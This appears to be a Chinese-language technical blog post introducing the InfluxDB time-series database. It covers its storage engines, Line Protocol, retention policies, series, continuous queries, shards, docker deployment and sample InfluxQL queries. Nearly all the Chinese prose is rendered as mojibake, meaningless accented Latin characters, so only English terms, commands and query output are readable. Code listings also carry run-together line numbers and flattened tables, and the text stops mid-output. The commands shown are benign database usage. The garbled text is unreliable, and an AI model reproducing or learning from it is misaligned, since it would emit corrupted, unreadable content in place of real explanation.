    <content type="text"><![CDATA[ÊúÄËøëÂÖ¨Âè∏‰∏öÂä°ÈáçÂ∫¶‰æùËµñÊó∂Â∫èÊï∞ÊçÆÂ∫ì, ÂÖ¨Âè∏‰∏ä‰∏™ÁâàÊú¨ÈÄâÊã©‰∫ÜOpenTSDB, Âú®1-2Âπ¥ÂâçÔºå‰ªñÁöÑÁ°ÆÂæàÊµÅË°å„ÄÇ ‰ΩÜÊòØÂú®ÂÅöËΩØ‰ª∂ÈáçÊûÑÊó∂, ‰∏öÂä°Â±ÇÂèçÈ¶àÁöÑ‰∏Ä‰∫õÈóÆÈ¢ò, OpenTSDBÊöÇÊó∂Êó†Ê≥ïËß£ÂÜ≥,Êàê‰∏∫‰∫Ü‰∏Ä‰∏™ÁóõÁÇπ, ËÆ©ÊàëÈúÄË¶ÅËÄÉËôëÂÖ∂‰ªñÊñπÊ°à, Áî±‰∫é‰πãÂâç‰ΩøÁî®ËøáInfluxDB, ‰πü‰∏ÄÁõ¥Âú®ÂÖ≥Ê≥®, ÂÆÉÁªô‰∫ÜÊàëÊÉäËâ≥ÁöÑÊÑüËßâ,ÊâÄ‰ª•ËÆ∞ÂøÜÁäπÊñ∞. ËÉåÊôØ‰πãÂâçÂÅöËøêÁª¥Êó∂,ÈáçÂ∫¶‰ΩøÁî®Ëøázabbix, ÂÖ≥Á≥ªÂûãÊï∞ÊçÆÂ∫ìÁöÑ‰ºòÂåñ,Ê†πÊú¨Êó†Ê≥ïËß£ÂÜ≥È´òIO, ÂêéÈù¢Âèà‰ΩøÁî®ËøáGraphite, Ëøô‰∏™ÂÆâË£ÖÂÉèËø∑‰∏ÄÊ†∑ÁöÑÂ∑•ÂÖ∑, ÂÆÉÂêéÁ´ØÂú®RRD‰∏äÈù¢ËÆæËÆ°Âá∫‰∫Ü‰∏Ä‰∏™ÁÆÄÂçïÁöÑÊó∂Â∫èÊï∞ÊçÆÂ∫ì, ‰ΩÜÊòØÈÖçÁΩÆÁπÅÊùÇ,ÂÆπÈáèÂÆåÂÖ®Èù†ËßÑÂàí„ÄÇÁõ¥Âà∞‰ΩøÁî®‰∫ÜInfluxDB, ÈÉ®ÁΩ≤ÁÆÄÂçï,‰ΩøÁî®Êñπ‰æø,È´òÂéãÁº©, ÂØπÂÆÉÂç∞Ë±°Âæà‰∏çÈîô, ‰ΩÜÊòØ0.12ËøáÂêé‰∏çÊîØÊåÅÈõÜÁæ§„ÄÇ ‰πãÂâçInfluxDBÂàáÊç¢‰∫Ü2Ê¨°Â≠òÂÇ®ÂºïÊìé(ÂÆÉÁöÑÂ≠òÂÇ®ÊòØÊèí‰ª∂ÂºèÁöÑ), ‰πüÊ≤°Âéª‰∫ÜËß£ËøáÂÆÉÂàáÊç¢ÁöÑÂéüÂõ†, Áõ¥Âà∞ÁúãÂà∞InfoQ‰∏ä‰∏ÉÁâõÁöÑÊºîËÆ≤‰ªéInfluxDBÁúãÊó∂Â∫èÊï∞ÊçÆÁöÑÂ§Ñ, ‰ªñÈÅìÂá∫‰∫Ü‰∫ÜÂéüÂõ†: LevelDB‰∏çÊîØÊåÅÁÉ≠Â§á‰ªΩ, influxDBËÆæËÆ°ÁöÑshard‰ºöÊ∂àËÄóÂ§ßÈáèÊñá‰ª∂ÊèèËø∞Á¨¶ÔºåÂ∞ÜÁ≥ªÁªüËµÑÊ∫êËÄóÂ∞Ω„ÄÇ BoltDBËß£ÂÜ≥‰∫ÜÁÉ≠Â§á, Ëß£ÂÜ≥‰∫ÜÊ∂àËÄóÂ§ßÈáèÊñá‰ª∂ÊèèËø∞Á¨¶ÁöÑÈóÆÈ¢ò, ‰ΩÜÊòØÂºïÂÖ•‰∫Ü‰∏Ä‰∏™Êõ¥Ëá¥ÂëΩÁöÑÈóÆÈ¢ò:ÂÆπÈáèËææÂà∞Êï∞GBÁ∫ßÂà´Êó∂,‰ºö‰∫ßÁîüÂ§ßÈáèÈöèÊú∫ÂÜô, ÈÄ†ÊàêÈ´òIOPS„ÄÇ ÊîæÂºÉ‰∫Ü‰ªñ‰ª¨, Âú®‰ªñ‰ª¨ÁöÑÁªèÈ™å‰∏äÂºÄÂßãËá™Â∑±ÂÆûÁé∞‰∏Ä‰∏™Â≠òÂÇ®ÂºïÊìé: TSM(Time-Structured Merge Tree), ÂÆÉÊà™Âèñ‰∫ÜOpenTSDBÁöÑ‰∏Ä‰∫õËÆæËÆ°ÁªèÈ™å,Ê†πÊçÆLSM TreeÈíàÂØπÊó∂Èó¥Â∫èÂàóÊï∞ÊçÆËøõË°å‰ºòÂåñ ÊàëËÆ§‰∏∫ÂÉèËøôÊ†∑ÁöÑÈíàÂØπÁâπÊÆäÂú∫ÊôØËøõË°å‰ºòÂåñÁöÑÊï∞ÊçÆÂ∫ì‰ºöÊòØ‰ªäÂêéÊï∞ÊçÆÂ∫ìÈ¢ÜÂüüÂèëÂ±ïÁöÑ‰∏ªÊµÅ, Âè¶‰∏Ä‰∏™ËØÅÊòéÂ∞±ÊòØEleasticSearch‰∏Ä‰∏™ÈíàÂØπÊñáÊú¨Ëß£Á¥¢ËÄåËÆæËÆ°ÁöÑÊï∞ÊçÆÂ∫ì, ËôΩÁÑ∂OpenTSDB‰πüÈíàÂØπÊó∂Â∫èÊï∞ÊçÆÂÅö‰∫Ü‰ºòÂåñ,‰ΩÜÊòØÁî±‰∫éÂ≠òÂÇ®Á≥ªÁªü‰æùÁÑ∂‰æùËµñHBase, ÊâÄ‰ª•ÂäõÂ∫¶‰∏äÈù¢ÊÑüËßâÊ≤°InfluxDBÁªôÂäõ„ÄÇ Á§æÂå∫‰∏ÄË∑ØËµ∞Êù•‰πãËâ∞Ëæõ,‰ΩÜÊòØÂç¥ÊøÄÊÉÖÊ¥ãÊ∫¢,‰ªñ‰ª¨ÊòØÂÖàË°åËÄÖ. ÊàëÂØπÂÆÉÈõÜÁæ§ÁöÑÈó≠Ê∫êÂπ∂‰∏çÂèçÊÑü, ËøôÁæ§ÊøÄÊÉÖÊ¥ãÊ∫¢ÁöÑ‰∫∫ÈúÄË¶ÅÊúâÂïÜ‰∏öÊîØÊåÅ„ÄÇ Êó∂Â∫èÊï∞ÊçÆÂ∫ìÁÉ≠Â∫¶ÊéíÂêçËøôÊòØDB EngineÁöÑÊó∂Â∫èÊï∞ÊçÆÂ∫ì2017ÁöÑÊéíË°åÊ¶ú, Êà™ÂõæÊòØ2017-3ÊúàÁöÑÔºåÊúÄÊñ∞ÁöÑÂèØ‰ª•ÁÇπDB-Engines Ranking of Time Series DBMS‰∏äÂõæÂèØ‰ª•ÁúãÂá∫InfluxDBÊúÄËøëÂæàÁÉ≠, È¢ÜÂÖà‰ºòÂäøÊòéÊòæ‰∏ãÈù¢ÊòØÂØπÊØîInfluxDB, OpenTSDB, GraphiteÁöÑÂèòÂåñË∂ãÂäø„ÄÇÂØπ‰∫é‰∏Ä‰∏™ËÆæËÆ°Á≤æËâØÔºåÈÉ®ÁΩ≤ÁÆÄÂçïÔºå‰ΩøÁî®Êñπ‰æøÔºåËÄå‰∏îËøòÈ´òÊÄßËÉΩÁöÑÊó∂Â∫èÊï∞ÊçÆÂ∫ìËÄåË®Ä, ÊÉ≥‰∏çÁÉ≠ÈÉΩÈöæ„ÄÇ ÁÆÄ‰ªãÂü∫‰∫éGoËØ≠Ë®ÄÂºÄÂèëÔºåÁ§æÂå∫ÈùûÂ∏∏Ê¥ªË∑ÉÔºåÈ°πÁõÆÊõ¥Êñ∞ÈÄüÂ∫¶ÂæàÂø´ÔºåÊó•Êñ∞ÊúàÂºÇÔºåÂÖ≥Ê≥®Â∫¶È´ò, 1.0ÂèëÂ∏ÉËøáÂêé, Á®≥ÂÆöÊÄß‰πüÈùûÂ∏∏È´ò„ÄÇÂÆòÊñπÊòØËøôÊ†∑‰ªãÁªçInfluxDBÁöÑÔºö influxdbÊòØ‰∏Ä‰∏™‰ªéÂ∫ïÂ±Ç‰∏ÄÊ≠•‰∏ÄÊ≠•ÊàêÈïø‰∏∫ËÉΩÂ§ÑÁêÜÈ´òÂÜôÂÖ•,È´òÊü•ËØ¢ÁöÑÊó∂Â∫èÊï∞ÊçÆÂ∫ì, ÂÆÉ‰∏ìÈó®ÈíàÂØπÊó∂Â∫èÊï∞ÊçÆÂÅö‰∫Ü‰ºòÂåñ,ËÆ©ÂÖ∂Êõ¥È´òÊÄßËÉΩ, ‰ªñÂèØ‰ª•Áî®Êù•Â≠òÂÇ®‰ªª‰ΩïÊó∂Â∫èÊï∞ÊçÆ, ÂåÖÊã¨DevOpsÁöÑÁõëÊéß„ÄÅÂ∫îÁî®ÊåáÊ†á„ÄÅÁâ©ËÅîÁΩë‰º†ÊÑüÂô®ÁöÑÊï∞ÊçÆ, Âπ∂ÂÆûÊó∂ÂàÜÊûê ËøôÊòØÂÆÉgithub‰∏äÁªôÂá∫ÁöÑÁâπÊÄßËØ¥Êòé: ÂÜÖÂª∫HTTP API, Êó†ÈúÄËá™Â∑±ÂÆûÁé∞ Êï∞ÊçÆÈ´òÂéãÁº©, ÊîØÊåÅÈùûÂ∏∏ÁÅµÊ¥ªÁöÑÊü•ËØ¢ËÆøÈóÆ ÊîØÊåÅÁ±ªSQLÊü•ËØ¢, Â≠¶‰π†ÊàêÊú¨‰Ωé, Êñπ‰æø‰ΩøÁî® ÂÆâË£ÖÂíåÁÆ°ÁêÜÈÉΩÂçÅÂàÜÁÆÄÂçï, Êï∞ÊçÆÂÜôÂÖ•ÂíåËØªÂèñÁöÑÈÄüÂ∫¶Âø´ ‰∏∫ÂÆûÊó∂Êü•ËØ¢ËÄåÁîü, ÂØπÊØè‰∏Ä‰∏™ÁÇπ‰ΩçÈÉΩÂª∫Á´ãÁ¥¢Âºï, ÂèäÊó∂Êü•ËØ¢ÂìçÂ∫îÈÄüÂ∫¶Â∞è‰∫é100ms ‰∏öÂä°ÈóÆÈ¢òÊàë‰ª¨ÈúÄË¶Å‰∏Ä‰∏™Êó∂Â∫èÊï∞ÊçÆÂ∫ì, ‰ªñÈúÄË¶ÅËÉΩËß£ÂÜ≥Êàë‰ª¨‰ª•‰∏ãËøô‰∫õÈóÆÈ¢ò: ‰∏Ä‰∏™ÊµãËØïÊåáÊ†áÂ§öÂÄº‰∏Ä‰∏™ÊåáÊ†áÂæÄÂæÄÊúâÂ§ö‰∏™Áª¥Â∫¶Êù•ÊèèËø∞ÂÖ∂ÂèòÂåñÁä∂ÊÄÅ,Âπ∂‰∏ç‰ªÖ‰ªÖÊòØÂÄº, ÊØîÂ¶ÇÂØπ‰∫éCPUÁöÑËÄåË®Ä, Â∫îËØ•Êúâ‰∏≠Êñ≠ÔºåË¥üËΩΩ, ‰ΩøÁî®ÁéáÁ≠â„ÄÇ Â§öTagÊîØÊåÅtagÊòØÂØπ‰∏Ä‰∏™ÊåáÊ†áÁöÑÊèèËø∞,ÊòØ‰∏Ä‰∏™Ê†áÁ≠æ, Âú®‰∏öÂä°‰∏äTagÂØπ‰∫éÂàÜÁªÑËøáÊª§ÈùûÂ∏∏ÊúâÊÑè‰πâ, Áî®‰∫éÊ†áÁ§∫‰∏Ä‰∏™ÊåáÊ†áÂú®‰∏öÂä°‰∏äÁöÑÊÑè‰πâ, ÊØîÂ¶ÇÂØπ‰∫éIOTÊù•ËØ¥, ‰º†ÊÑüÂô®ÁöÑÊåáÊ†áÂæÄÂæÄÊòØ‰∏Ä‰∏™Êó†ÊÑè‰πâÁöÑid, Âõ†Ê≠§ÈúÄÊ±ÇÁªôÂÆÉÊâì‰∏änameÊ†áÁ≠æ, Ê†áÁ§∫‰ªñÁöÑÁâπÊÆäÊÑè‰πâ, Êâì‰∏äËÆæÂ§áID, Ê†áÁ§∫ÂÆÉÂ±û‰∫éÂì™‰∏™ËÆæÂ§á, Êâì‰∏ä‰ΩçÁΩÆÊ†áÁ≠æ, Ê†áÁ§∫ËØ•ÊåáÊ†áÊù•Ê∫ê‰∫éÂì™‰∏™Âú∞Êñπ„ÄÇ Âú®ÊåáÊ†áÁöÑÂÄº‰∏äËÉΩÂÅö‰∏Ä‰∫õÂü∫Êú¨ÁöÑÊØîËæÉËøêÁÆó‰Ωú‰∏∫‰∏Ä‰∏™Êï∞ÊçÆÂ∫ì,Âú®ÂäüËÉΩÂ±ÇÈù¢ÈúÄË¶ÅËß£ÂÜ≥‰∏Ä‰∫õÂü∫Êú¨ÁöÑËøêÁÆó, ÊØîÂ¶ÇÊ±ÇÂíåÔºåÊ±ÇÊúÄÂ∞èÔºåÊ±ÇÊúÄÂ§ß, ‰ΩÜËøôËøò‰∏çÂ§ü, ÈúÄË¶ÅÊîØÊåÅÊù°‰ª∂ËøáÊª§, ÊîØÊåÅTagÁöÑÊù°‰ª∂ËøáÊª§, ÊîØÊåÅÂÄºÁöÑÊù°‰ª∂ËøáÊª§, ÊîØÊåÅÂÄºÁöÑÊù°‰ª∂ËøáÊª§ÊòØÂÖ≥ÈîÆ, ‰∏çÁÑ∂‰ºö‰∫ßÁîüÂ∑®Â§ßÁöÑÊï∞ÊçÆÂ§çÂà∂, ÊØîÂ¶ÇÊàë‰ª¨ÈúÄË¶ÅËøáÊª§Âá∫ CPU &gt; 90ÁöÑÊú∫Âô®, Â¶ÇÊûúÊï∞ÊçÆÂ∫ì‰∏çÊîØÊåÅ, ÈÇ£‰πàÊàëÈúÄË¶ÅÂ∞ÜËøô‰∫õÊï∞ÊçÆ‰ªéÊï∞ÊçÆÂ∫ì‰∏≠Êü•Âá∫Êù•,Â§çÂà∂ÁªôÊàëÁöÑÁ®ãÂ∫èÂ§ÑÁêÜ„ÄÇ ËøôÂ∏¶Êù•‰∫ÜÂ∑®Â§ßÁöÑÈóÆÈ¢ò: 1. Êï∞ÊçÆÂ∫ìË¶ÅÂêêÂá∫Â¶ÇÊ≠§Â§ßÈáèÁöÑÊï∞ÊçÆ, Ë¥üËΩΩÂçáÈ´ò, Âá∫Âè£ÊµÅÈáèÊö¥Â¢û 2.Á®ãÂ∫èÊãøÂà∞Â¶ÇÊ≠§Â§ßÈáèÁöÑÊï∞ÊçÆ, ÁªôÂ§ÑÁêÜÊñπÂ∏¶Êù•‰∫ÜÂ∑®Â§ßÁöÑËÆ°ÁÆóÂéãÂäõ, Â¶ÇÊûúÂâçÊÆµÈááÁî®AngularÊàñËÄÖReactÊù•ÂÜô, ‰∏Ä‰∏™ËøêË°åÂú®pc‰∏äÁöÑÂ∞èÂ∞èÁöÑÊµèËßàÂô®,Ê†πÊú¨Â§ÑÁêÜ‰∏ç‰∫Ü„ÄÇ3. Â§ÑÁêÜÊïàÁéá‰ΩéÔºåÊï∞ÊçÆÁöÑÂ§ÑÁêÜÊú¨ËØ•Âú®Êï∞ÊçÆÂ≠òÂÇ®ÁöÑÂú∞ÊñπËøõË°å, ÊØîÂ¶ÇHadoop, ÂÆåÂÖ®Ê≤°ÂøÖË¶ÅÂ§çÂà∂„ÄÇ ÊåáÊ†áËÆ°ÁÆóÁöÑ‰∏≠Èó¥ÁªìÊûúÈúÄË¶ÅÂ≠ò‰ºöÊåáÊ†áËøôÊòØ‰∏Ä‰∏™ÊØîËæÉÂ∏∏ËßÅÁöÑÂú∫ÊôØ, ‰ΩøÁî®RDDÊó∂Êõ¥ÊòØÂ∏∏Áî®,ÊØîÂ¶ÇÊï∞ÊçÆÊòØÊåâÁÖß30ÁßíÂ≠òÂÇ®ÁöÑÔºå‰ΩÜÊòØÊàëÈúÄË¶Å ËøôÊ†∑‰∏Ä‰∏™ËÅöÂêàÁª¥Â∫¶ 5m, 15m, 1h, 3h, 12h, ÁÑ∂ÂêéÊàëÂπ≥Êó∂Âè™‰ΩøÁî®Ëøô‰∫õÁª¥Â∫¶ÁöÑÊï∞ÊçÆ, ‰∏çÁî®ÊØèÊ¨°‰∏¥Êó∂ËÆ°ÁÆó„ÄÇ Ê¶ÇÂøµ‰ªãÁªçinfluxDBÁöÑÊ†∏ÂøÉÊ¶ÇÂøµÂåÖÂê´: Line Protocol, Retention Policy, Series, Point, Continuous Query. Line ProtocolLine ProtocolÁî®‰∫éÊèèËø∞Â≠òÂÖ•Êï∞ÊçÆÂ∫ìÁöÑÊï∞ÊçÆÊ†ºÂºè, ‰πüÂèØ‰ª•ËØ¥ÊòØÊï∞ÊçÆÂçèËÆÆ, Áõ∏ÊØî‰∫éJSONÊ†ºÂºèÔºåLine ProtocolÊó†ÈúÄÂ∫èÂàóÂåñÔºåÊõ¥Âä†È´òÊïà, ÂÆòÊñπÂØπÂÆÉÂÅö‰∫ÜÂÖ®Èù¢ÁöÑ‰ªãÁªçLine Protocol, ‰∏ãÈù¢ÊëòÂèñËØ≠Ê≥ïÈÉ®ÂàÜÂÅöÁÆÄË¶ÅËØ¥ÊòéÔºöLine ProtocolÈáåÈù¢ÁöÑ‰∏ÄË°åÂ∞±ÊòØInfluxDBÈáåÈù¢ÁöÑ‰∏Ä‰∏™ÁÇπ‰Ωç, ‰ªñÂ∞Ü‰∏Ä‰∏™ÁÇπÂàÜÂâ≤Êàêmeasurement, tag_set, field_set, timestamp4‰∏™ÈÉ®ÂàÜ, ‰æãÂ¶Ç:12345678910ËØ≠Ê≥ïÊ†ºÂºè: measurement[,tag_key1=tag_value1...] field_key=field_value[,field_key2=field_value2] [timestamp]Ê†óÂ≠ê:weather,location=us-midwest temperature=82 1465839830100400200 | -------------------- -------------- | | | | | | | | |+-----------+--------+-+---------+-+---------+|measurement|,tag_set| |field_set| |timestamp|+-----------+--------+-+---------+-+---------+ measurement: metric name, ÈúÄË¶ÅÁõëÊéßÁöÑÊåáÊ†áÁöÑÂêçÁß∞, ÊØîÂ¶Ç‰∏äÈù¢ÁöÑweather tag_set: ‰ΩøÁî®‚Äù,‚Äù‰∏émeasurementÈöîÂºÄ, Ë°®Á§∫‰∏ÄÁªÑTagÁöÑÈõÜÂêà, Áî®‰∫é‰øùÂ≠òÁÇπ‰ΩçÁöÑÂÖÉÊï∞ÊçÆ, ‰∏∫ÂèØÈÄâÈ°π, ‰ºöËøõË°åÁ¥¢ÂºïÔºåÊñπ‰æøÊü•ËØ¢Êó∂Áî®‰∫éËøáÊª§Êù°‰ª∂Ôºå Ê†ºÂºè: =,=, ÊØîÂ¶Ç‰∏äÈù¢ÁöÑlocation=us-midwest field_set: ‰ΩøÁî®Á©∫Ê†º‰∏étag_setÈöîÂºÄ, Ê†áÁ§∫‰∏ÄÁªÑFieldÁöÑÈõÜÂêà, Áî®‰∫é‰øùÂ≠òËØ•ÁÇπ‰ΩçÂ§öÁª¥Â∫¶ÁöÑÂÄº, ÊîØÊåÅÂêÑÁßçÁ±ªÂûãÔºåÊï∞ÊçÆÂ≠òÂÇ®Êó∂‰∏ç‰ºöËøõË°åÁ¥¢Âºï,Ê†ºÂºè: =,=, ÊØîÂ¶Ç‰∏äÈù¢ÁöÑtemperature=82 timestamp: ÈááÈõÜËØ•ÁÇπ‰ΩçÁöÑÊó∂Èó¥Êà≥, Êó∂Èó¥ÁöÑÈªòËÆ§Á≤æÂ∫¶ÊòØÁ∫≥Áßí. Â≠òÂÇ®Á≠ñÁï•:measurements,tag keys,field keys,tag valuesÂÖ®Â±ÄÂ≠ò‰∏Ä‰ªΩ„ÄÇfield valuesÂíåtimestampsÊØèÊù°Êï∞ÊçÆÂ≠ò‰∏Ä‰ªΩ„ÄÇ Retention PolicyÊåáÊï∞ÊçÆÁöÑ‰øùÂ≠òÁ≠ñÁï•, ÂåÖÂê´Êï∞ÊçÆÁöÑ‰øùÂ≠òÊó∂Èó¥ÂíåÂâØÊú¨Êï∞(ÈõÜÁæ§‰∏≠ÁöÑÊ¶ÇÂøµ),ÈªòËÆ§‰øùÂ≠òÊó∂Èó¥ÊòØÊ∞∏‰πÖÔºåÂâØÊú¨ÊòØ1‰∏™, ‰ΩÜÊòØÊàë‰ª¨ÂèØ‰ª•‰øÆÊîπ, ‰πüÂèØ‰ª•ÂàõÂª∫Êñ∞ÁöÑ‰øùÂ≠òÁ≠ñÁï• SeriesInfluxDB‰∏≠ÂÖÉÊï∞ÊçÆÁöÑÊï∞ÊçÆÁªìÊûÑ‰Ωì, seriesÁõ∏ÂΩì‰∫éÊòØInfluxDB‰∏≠ÂÖÉÊï∞ÊçÆÁöÑÈõÜÂêàÔºåÂú®Âêå‰∏Ä‰∏™database‰∏≠Ôºåretention policy„ÄÅmeasurement„ÄÅtag setsÂÆåÂÖ®Áõ∏ÂêåÁöÑÊï∞ÊçÆÂêåÂ±û‰∫é‰∏Ä‰∏™seriesÔºåÂêå‰∏Ä‰∏™seriesÁöÑÊï∞ÊçÆÂú®Áâ©ÁêÜ‰∏ä‰ºöÊåâÁÖßÊó∂Èó¥È°∫Â∫èÊéíÂàóÂ≠òÂÇ®Âú®‰∏ÄËµ∑„ÄÇseries ÁöÑkey‰∏∫ measurement+ÊâÄÊúâtagsÁöÑÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤, ‰ªñ‰øùÂ≠òÁùÄËØ•seriesÁöÑRetention policy, Measurement,Tag set, ÊØîÂ¶Ç:123456|--------------------------------------------------------------------------------------------------||Arbitrary series number | Retention policy | Measurement | Tag set ||series 1 | autogen | census | location = 1,scientist = langstroth ||series 2 | autogen | census | location = 2,scientist = langstroth ||series 3 | autogen | census | location = 1,scientist = perpetua ||--------------------------------------------------------------------------------------------------| PointInfluxDB‰∏≠ÂçïÊù°ÊèíÂÖ•ËØ≠Âè•ÁöÑÊï∞ÊçÆÁªìÊûÑ‰Ωì, Áî®‰∫é‰øùÂ≠òÁÇπ‰ΩçÁöÑÂÄºÁöÑÈõÜÂêà, ÊØè‰∏Ä‰∏™PointÈÄöËøáseriesÂíåtimestampËøõË°åÂîØ‰∏ÄÊ†áÁ§∫:1234name: census-----------------time butterflies honeybees location scientist2015-08-18T00:00:00Z 1 30 1 perpetua SchemaÁî®‰∫éÊèèËø∞Êï∞ÊçÆÂú®InfluxDBÁöÑÁªÑÁªáÂΩ¢Âºè, InfluxDBÁöÑSchemaÂçÅÂàÜÁÆÄÂçïÁî± Ëøô‰∫õÊ¶ÇÂøµÁªÑÊàê: databases retention policies series measurements tag keys tag values field keysÂú®Êìç‰ΩúÊï∞ÊçÆÂ∫ìÁöÑÊó∂ÂÄôÔºåÈúÄË¶ÅÁü•ÈÅìËøô‰∫õÊ¶ÇÂøµ„ÄÇ Continuous QueryÁÆÄÁß∞CQ, ÊòØÈ¢ÑÂÖàÈÖçÁΩÆÂ•ΩÁöÑ‰∏Ä‰∫õÊü•ËØ¢ÂëΩ‰ª§ÔºåSELECTËØ≠Âè•ÂøÖÈ°ªÂåÖÂê´GROUP BY time()Ôºåinfluxdb‰ºöÂÆöÊúüËá™Âä®ÊâßË°åËøô‰∫õÂëΩ‰ª§Âπ∂Â∞ÜÊü•ËØ¢ÁªìÊûúÂÜôÂÖ•ÊåáÂÆöÁöÑÂè¶Â§ñÁöÑmeasurement‰∏≠„ÄÇÂà©Áî®Ëøô‰∏™ÁâπÊÄßÂπ∂ÁªìÂêàRPÊàë‰ª¨ÂèØ‰ª•Êñπ‰æøÂú∞‰øùÂ≠ò‰∏çÂêåÁ≤íÂ∫¶ÁöÑÊï∞ÊçÆÔºåÊ†πÊçÆÊï∞ÊçÆÁ≤íÂ∫¶ÁöÑ‰∏çÂêåËÆæÁΩÆ‰∏çÂêåÁöÑ‰øùÂ≠òÊó∂Èó¥ÔºåËøôÊ†∑‰∏ç‰ªÖËäÇÁ∫¶‰∫ÜÂ≠òÂÇ®Á©∫Èó¥ÔºåËÄå‰∏îÂä†ÈÄü‰∫ÜÊó∂Èó¥Èó¥ÈöîËæÉÈïøÁöÑÊï∞ÊçÆÊü•ËØ¢ÊïàÁéáÔºåÈÅøÂÖçÊü•ËØ¢Êó∂ÂÜçËøõË°åËÅöÂêàËÆ°ÁÆó„ÄÇ Â≠òÂÇ®ÂºïÊìé‰ªéLevelDB(LSM Tree)ÔºåÂà∞BoltD(mmap B+Ê†ë)ÔºåÁé∞Âú®ÊòØËá™Â∑±ÂÆûÁé∞ÁöÑTSM TreeÁöÑÁÆóÊ≥ïÔºåÁ±ª‰ººLSM TreeÔºåÈíàÂØπInfluxDBÁöÑ‰ΩøÁî®ÂÅö‰∫ÜÁâπÊÆä‰ºòÂåñ„ÄÇ ShardShardËøô‰∏™Ê¶ÇÂøµÂπ∂‰∏çÂØπÊôÆÈÄöÁî®Êà∑ÂºÄÊîæÔºåShard‰πü‰∏çÊòØÂ≠òÂÇ®ÂºïÊìé, ÂÆÉÂú®Â≠òÂÇ®ÂºïÊìé‰πã‰∏äÁöÑ‰∏Ä‰∏™Ê¶ÇÂøµ, Â≠òÂÇ®ÂºïÊìéË¥üË¥£Â≠òÂÇ®shard, Âõ†Ê≠§Âú®ËÆ≤Â≠òÂÇ®ÂºïÊìé‰πãÂâçÂÖàËÆ≤Êòéshard„ÄÇ Âú®InfluxDB‰∏≠ÊåâÁÖßÊï∞ÊçÆÁöÑÊó∂Èó¥Êà≥ÊâÄÂú®ÁöÑËåÉÂõ¥Ôºå‰ºöÂéªÂàõÂª∫‰∏çÂêåÁöÑshardÔºåÊØè‰∏Ä‰∏™shardÈÉΩÊúâËá™Â∑±ÁöÑÂ≠òÂÇ®ÂºïÊìéÁõ∏ÂÖ≥Êñá‰ª∂ÔºåËøôÊ†∑ÂÅöÁöÑÁõÆÁöÑÂ∞±ÊòØ‰∏∫‰∫ÜÂèØ‰ª•ÈÄöËøáÊó∂Èó¥Êù•Âø´ÈÄüÂÆö‰ΩçÂà∞Ë¶ÅÊü•ËØ¢Êï∞ÊçÆÁöÑÁõ∏ÂÖ≥ËµÑÊ∫êÔºåÂä†ÈÄüÊü•ËØ¢ÁöÑËøáÁ®ãÔºåÂπ∂‰∏î‰πüËÆ©‰πãÂêéÁöÑÊâπÈáèÂà†Èô§Êï∞ÊçÆÁöÑÊìç‰ΩúÂèòÂæóÈùûÂ∏∏ÁÆÄÂçï‰∏îÈ´òÊïà„ÄÇ ÂÆÉÂíåretention policyÁõ∏ÂÖ≥ËÅî„ÄÇÊØè‰∏Ä‰∏™Â≠òÂÇ®Á≠ñÁï•‰∏ã‰ºöÂ≠òÂú®ËÆ∏Â§öshardÔºåÊØè‰∏Ä‰∏™shardÂ≠òÂÇ®‰∏Ä‰∏™ÊåáÂÆöÊó∂Èó¥ÊÆµÂÜÖÁöÑÊï∞ÊçÆÔºåÂπ∂‰∏î‰∏çÈáçÂ§çÔºå‰æãÂ¶Ç7ÁÇπ-8ÁÇπÁöÑÊï∞ÊçÆËêΩÂÖ•shard0 ‰∏≠Ôºå8ÁÇπ-9ÁÇπÁöÑÊï∞ÊçÆÂàôËêΩÂÖ•shard1‰∏≠„ÄÇÊØè‰∏Ä‰∏™shardÈÉΩÂØπÂ∫î‰∏Ä‰∏™Â∫ïÂ±ÇÁöÑÂ≠òÂÇ®ÂºïÊìé„ÄÇ ÂΩìÊ£ÄÊµãÂà∞‰∏Ä‰∏™shard‰∏≠ÁöÑÊï∞ÊçÆËøáÊúüÂêéÔºåÂè™ÈúÄË¶ÅÂ∞ÜËøô‰∏™shardÁöÑËµÑÊ∫êÈáäÊîæÔºåÁõ∏ÂÖ≥Êñá‰ª∂Âà†Èô§Âç≥ÂèØÔºåËøôÊ†∑ÁöÑÂÅöÊ≥ï‰ΩøÂæóÂà†Èô§ËøáÊúüÊï∞ÊçÆÂèòÂæóÈùûÂ∏∏È´òÊïà„ÄÇ LevelDBBoltDBTSM TreeÂäüËÉΩ‰ΩøÁî®ÂÆâË£Ö‰∏éÈÉ®ÁΩ≤ÊàëËøôÈáå‰∏ªË¶ÅÂÅöÂäüËÉΩÊµãËØï, ÂêéÈù¢‰ºöÊúâÊú∫‰ºö‰∏ìÈó®ÂÅöÊÄßËÉΩÊµãËØï, Âõ†Ê≠§ËøôÈáå‰ΩøÁî®ÂÆòÊñπÊèê‰æõÁöÑdockerÈïúÂÉèÈÉ®ÁΩ≤,ÂÆòÊñπÈïúÂÉèÊúÄÊñ∞‰πüÊòØ1.2ÁâàÊú¨ÈÖçÁΩÆDaocloudÁöÑÈïúÂÉèÂä†ÈÄüÊ∫êÊàñËÄÖÈòøÈáåÁöÑÂä†ÈÄüÊ∫ê,ÁÑ∂ÂêéÁõ¥Êé•ÊãâÂèñÈïúÂÉè1docker pull influxdb Áî±‰∫éinfluxDBÂºÄÂèëÊó∂Â∞±ËÆæËÆ°Â•Ω‰∫Ü, ÂÆòÊñπ‰πüÁªôÂá∫‰∫ÜÁéØÂ¢ÉÈÖçÁΩÆÂèòÈáè,ÂêØÂä®Êó∂ÂèØ‰ª•ÈÄöËøáËøô‰∫õÁéØÂ¢ÉÂèòÈáèÂØπinfluxdbËøõË°åÈÖçÁΩÆInfluxDBÈÖçÁΩÆ ÂáΩÊï∞‰∏éSQLÂÜÖÈÉ®Êèê‰æõÂæàÂ§öÂáΩÊï∞,Êñπ‰æø‰∏Ä‰∫õÂü∫Êú¨Êìç‰ΩúInfluxQL Functions123456789101112131415161718192021222324252627282930&gt; SELECT MEAN("water_level") FROM "h2o_feet" WHERE "location"='coyote_creek' AND time &gt;= '2015-08-18T00:06:00Z' AND time &lt;= '2015-08-18T00:54:00Z' GROUP BY time(18m)name: h2o_feettime mean---- ----2015-08-18T00:00:00Z 7.9462015-08-18T00:18:00Z 7.63233333333333252015-08-18T00:36:00Z 7.2386666666666672015-08-18T00:54:00Z 6.982&gt; SELECT MAX("water_level") FROM "h2o_feet" WHERE time &gt;= '2015-08-18T00:00:00Z' AND time &lt; '2015-08-18T00:54:00Z' GROUP BY time(12m), "location"name: h2o_feettags: location = coyote_creektime max---- ---2015-08-18T00:00:00Z 8.122015-08-18T00:12:00Z 7.8872015-08-18T00:24:00Z 